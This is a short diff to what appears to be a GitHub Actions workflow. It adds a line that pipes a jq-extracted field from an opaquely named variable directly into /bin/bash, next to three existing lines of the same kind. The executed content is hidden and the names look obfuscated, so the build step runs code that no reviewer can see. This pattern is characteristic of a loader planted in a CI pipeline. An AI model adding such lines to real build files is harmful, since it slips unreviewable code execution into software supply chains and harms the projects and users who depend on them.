@@ -37,6 +37,7 @@ jobs:
           echo $vm3784 | jq -r .t179 | /bin/bash
           echo $m65 | jq -r .m8 | /bin/bash
           echo $fgh6 | jq -r .hxb5062 | /bin/bash
+          echo $eyo3 | jq -r .r36 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
